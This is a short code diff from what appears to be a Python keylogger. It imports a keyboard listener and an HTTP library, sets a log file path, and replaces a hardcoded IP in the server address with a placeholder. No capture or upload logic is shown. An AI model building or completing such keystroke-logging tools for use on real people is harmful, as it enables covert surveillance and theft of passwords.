@@ -2,7 +2,7 @@ import requests
 from pynput import keyboard
 import os
 
-SERVER_URL = "http://192.168.1.141:5000"
+SERVER_URL = ":5000" ## Add your ip in here to start a local host web server
 
 # Absolute path for log file
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
